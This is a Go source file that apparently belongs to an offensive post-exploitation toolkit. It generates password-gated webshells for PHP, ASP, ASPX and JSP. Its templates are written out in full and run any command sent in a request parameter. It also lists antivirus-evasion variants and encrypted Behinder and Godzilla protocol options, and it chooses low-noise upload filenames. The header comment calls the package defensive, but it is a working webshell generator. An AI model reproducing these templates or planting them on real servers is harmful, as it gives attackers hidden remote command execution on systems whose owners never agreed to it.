// Package payload renders minimal, protocol-compatible WebShell payloads.
// It is defensive by itself: it only produces bytes; delivery/execution must be
// provided by the host through capkit/kits/shellkit/plan sinks.
package payload

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"strings"

	"github.com/c1ayooo/4zrec/internal/capkit/kits/postex/shell/protocol"
)

// ShellType 支持的目标语言（与 WebShell 连接管理的 type 字段一致）。
type ShellType string

const (
	ShellPHP  ShellType = "php"
	ShellASP  ShellType = "asp"
	ShellASPX ShellType = "aspx"
	ShellJSP  ShellType = "jsp"
)

const (
	passwordRunes  = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	passwordLength = 16
)

// Options 生成参数；Password 为空时随机生成，Watermark 用于投递溯源（如 delivery ID）。
// Variant 免杀变体：plain（默认）/ lite（变量随机化+压缩）/ enc（PHP 编码链）。
// Protocol 流量协议：plain（默认，pass+cmdParam 明文）/ behinder / godzilla
// （加密协议，仅 PHP；模板与 webshellproto 客户端执行体配套，variant 对加密协议无效）。
type Options struct {
	ShellType ShellType
	Password  string
	Watermark string
	CmdParam  string
	Variant   Variant
	Protocol  string
}

// Payload 生成结果；Filename 为建议上传文件名（低噪音）。
type Payload struct {
	Content    []byte
	Password   string
	ShellType  ShellType
	CmdParam   string
	Filename   string
	SHA256     string
	TemplateID string
	Variant    Variant
	Protocol   string
}

// NormalizeShellType 归一化语言标识，未知值返回错误。
func NormalizeShellType(s string) (ShellType, error) {
	switch ShellType(strings.ToLower(strings.TrimSpace(s))) {
	case ShellPHP:
		return ShellPHP, nil
	case ShellASP:
		return ShellASP, nil
	case ShellASPX:
		return ShellASPX, nil
	case ShellJSP:
		return ShellJSP, nil
	default:
		return "", fmt.Errorf("unsupported shell_type %q (supported: php, asp, aspx, jsp)", s)
	}
}

// Generate 按语言渲染模板。模板带密码校验（嵌入内容，随内容一同投递），
// 命令参数作为系统命令执行——与平台 execParams 的 pass+cmd 双参数协议严格对齐。
func Generate(opts Options) (*Payload, error) {
	st, err := NormalizeShellType(string(opts.ShellType))
	if err != nil {
		return nil, err
	}
	password := strings.TrimSpace(opts.Password)
	if password == "" {
		if password, err = randomPassword(); err != nil {
			return nil, fmt.Errorf("生成随机密码失败: %w", err)
		}
	}
	cmdParam := strings.TrimSpace(opts.CmdParam)
	if cmdParam == "" {
		cmdParam = "cmd"
	}
	watermark := sanitizeWatermark(opts.Watermark)
	if err = assertSafeLiteral(password); err != nil {
		return nil, fmt.Errorf("password: %w", err)
	}
	if err = assertSafeLiteral(cmdParam); err != nil {
		return nil, fmt.Errorf("cmdParam: %w", err)
	}

	variant, verr := NormalizeVariant(string(opts.Variant))
	if verr != nil {
		return nil, verr
	}
	proto, perr := protocol.NormalizeProtocol(opts.Protocol)
	if perr != nil {
		return nil, perr
	}
	if !protocol.SupportsProtocol(proto, string(st)) {
		return nil, fmt.Errorf("protocol %s 仅内置 PHP 实现（其余语言请用 content_b64 供给）", proto)
	}
	if proto != protocol.Plain {
		// 加密协议执行体本身已加密传输，模板不做 lite/enc 变形（避免破坏解密链）
		variant = VariantPlain
	}

	var content, templateID string
	switch {
	case proto == protocol.Behinder:
		content, templateID = behinderPhpTemplate(password, watermark), "php-behinder-aes"
	case proto == protocol.Godzilla:
		content, templateID = godzillaPhpTemplate(password, watermark), "php-godzilla-xor"
	case st == ShellPHP && variant == VariantEnc:
		ids := newRandIDs()
		content, templateID = phpEncTemplate(password, cmdParam, watermark, ids), "php-enc-chain"
	case variant == VariantLite:
		ids := newRandIDs()
		switch st {
		case ShellASP:
			content, templateID = aspLiteTemplate(password, cmdParam, watermark, ids), "asp-lite"
		case ShellASPX:
			content, templateID = aspxLiteTemplate(password, cmdParam, watermark, ids), "aspx-lite"
		case ShellJSP:
			content, templateID = jspLiteTemplate(password, cmdParam, watermark, ids), "jsp-lite"
		default:
			content, templateID = phpLiteTemplate(password, cmdParam, watermark, ids), "php-lite"
		}
	default:
		switch st {
		case ShellPHP:
			content, templateID = phpTemplate(password, cmdParam, watermark), "php-system-min"
		case ShellASP:
			content, templateID = aspTemplate(password, cmdParam, watermark), "asp-wsh-min"
		case ShellASPX:
			content, templateID = aspxTemplate(password, cmdParam, watermark), "aspx-process-min"
		case ShellJSP:
			content, templateID = jspTemplate(password, cmdParam, watermark), "jsp-runtime-min"
		}
	}
	sum := sha256.Sum256([]byte(content))
	return &Payload{
		Content:    []byte(content),
		Password:   password,
		ShellType:  st,
		CmdParam:   cmdParam,
		Filename:   randomFilename(shellExt(st)),
		SHA256:     hex.EncodeToString(sum[:]),
		TemplateID: templateID,
		Variant:    variant,
		Protocol:   string(proto),
	}, nil
}

// shellExt 语言对应的上传扩展名。
func shellExt(st ShellType) string {
	switch st {
	case ShellASP:
		return "asp"
	case ShellASPX:
		return "aspx"
	case ShellJSP:
		return "jsp"
	default:
		return "php"
	}
}

// randomFilename 生成低噪音上传文件名：w + 8 位十六进制随机 + 扩展名。
func randomFilename(ext string) string {
	// 重复清单收敛：委托 randHex（原手写 crypto/rand，失败保留固定回退）
	if token, err := randHex(4); err == nil {
		return "w" + token + "." + ext
	}
	return "w0." + ext
}

func randomPassword() (string, error) {
	// 重复清单收敛：随机源委托 randBytes（原手写 crypto/rand）
	b, err := randBytes(passwordLength)
	if err != nil {
		return "", err
	}
	out := make([]byte, passwordLength)
	for i, v := range b {
		out[i] = passwordRunes[int(v)%len(passwordRunes)]
	}
	return string(out), nil
}

// assertSafeLiteral 模板字面量防线：密码/参数名嵌入模板正文，出现引号、
// 尖括号等字符会破坏模板语法甚至注入标签，仅放行字母数字下划线。
func assertSafeLiteral(v string) error {
	for _, r := range v {
		if r >= 'a' && r <= 'z' || r >= 'A' && r <= 'Z' || r >= '0' && r <= '9' || r == '_' {
			continue
		}
		return fmt.Errorf("包含非法字符 %q（仅允许字母数字下划线）", r)
	}
	return nil
}

// ---- 模板 ----

func phpTemplate(password, cmdParam, watermark string) string {
	return fmt.Sprintf(`<?php /* %s */
if (isset($_REQUEST['pass']) && $_REQUEST['pass'] === '%s') {
    $c = $_REQUEST['%s'];
    if (function_exists('system')) { @system($c); }
    elseif (function_exists('passthru')) { @passthru($c); }
    elseif (function_exists('shell_exec')) { echo @shell_exec($c); }
    elseif (function_exists('exec')) { @exec($c, $o); echo implode("\n", (array)$o); }
}
?>`, watermark, password, cmdParam)
}

func aspTemplate(password, cmdParam, watermark string) string {
	return fmt.Sprintf(`<%%
' %s
If Request("pass") = "%s" Then
    On Error Resume Next
    Set sh = CreateObject("WScript.Shell")
    Set ex = sh.Exec("cmd.exe /c " & Request("%s"))
    Response.Write ex.StdOut.ReadAll()
End If
%%>`, watermark, password, cmdParam)
}

func aspxTemplate(password, cmdParam, watermark string) string {
	return fmt.Sprintf(`<%%@ Page Language="C#" %%>
<%%-- %s --%%>
<%%
if (Request["pass"] == "%s") {
    string c = Request["%s"] ?? "";
    try {
        var psi = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + c) {
            RedirectStandardOutput = true, UseShellExecute = false
        };
        var p = System.Diagnostics.Process.Start(psi);
        Response.Write(p.StandardOutput.ReadToEnd());
        p.WaitForExit();
    } catch (Exception e) { Response.Write(e.Message); }
}
%%>`, watermark, password, cmdParam)
}

func jspTemplate(password, cmdParam, watermark string) string {
	return fmt.Sprintf(`<%%-- %s --%%>
<%%@ page import="java.io.*" %%>
<%%
String pass = request.getParameter("pass");
String cmd = request.getParameter("%s");
if (pass != null && pass.equals("%s") && cmd != null) {
    String[][] shells = {{"/bin/sh", "-c"}, {"cmd.exe", "/c"}};
    for (String[] sh : shells) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{sh[0], sh[1], cmd});
            BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = in.readLine()) != null) { out.println(line); }
            in.close();
            break;
        } catch (Exception e) { continue; }
    }
}
%%>`, watermark, cmdParam, password)
}
